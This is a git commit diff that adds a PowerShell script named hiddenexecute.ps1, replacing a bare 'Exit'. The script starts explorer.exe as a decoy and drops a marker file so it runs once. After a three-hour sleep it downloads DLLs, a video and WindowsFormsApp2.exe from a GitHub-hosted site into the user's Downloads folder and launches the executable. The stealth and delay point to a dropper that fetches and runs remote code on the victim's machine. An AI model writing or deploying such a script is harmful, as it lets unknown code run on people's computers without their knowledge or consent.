92b6bcf46549fe710c3677ce6d359454742699c3
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-11 09:29:24 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,1 +1,32 @@
-Exit
+$urls = @(
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/video.mp4",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
+)
+
+$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+
+Start-Process "explorer.exe"
+
+if (Test-Path -Path $filePath) {
+    exit
+} else {
+    New-Item -Path $filePath -ItemType File
+}
+
+Start-Sleep -Seconds 10800
+
+$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
+if (-not (Test-Path -Path $downloadDir)) {
+    New-Item -ItemType Directory -Path $downloadDir
+}
+
+foreach ($url in $urls) {
+    $fileName = [System.IO.Path]::GetFileName($url)
+    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
+    Invoke-WebRequest -Uri $url -OutFile $destinationPath
+}
+
+$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
+Start-Process -FilePath $exePath
